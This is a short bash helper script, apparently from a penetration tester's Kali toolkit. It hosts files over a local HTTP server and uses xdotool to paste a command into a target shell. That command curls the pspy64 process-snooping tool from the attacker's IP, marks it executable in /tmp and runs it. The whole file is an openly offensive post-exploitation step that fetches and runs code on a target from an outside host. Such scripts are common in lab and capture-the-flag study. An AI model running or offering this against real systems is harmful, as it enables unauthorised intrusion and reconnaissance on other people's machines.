#!/bin/bash

: '
download pspy64 to server and run it
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd /opt/linux
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "curl http://${KALI_IP}:1337/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && cd /tmp && ls -alF /tmp && /tmp/pspy64 -pf -i 1000"
xdotool key Return
sleep 10

kill $HTTP_PID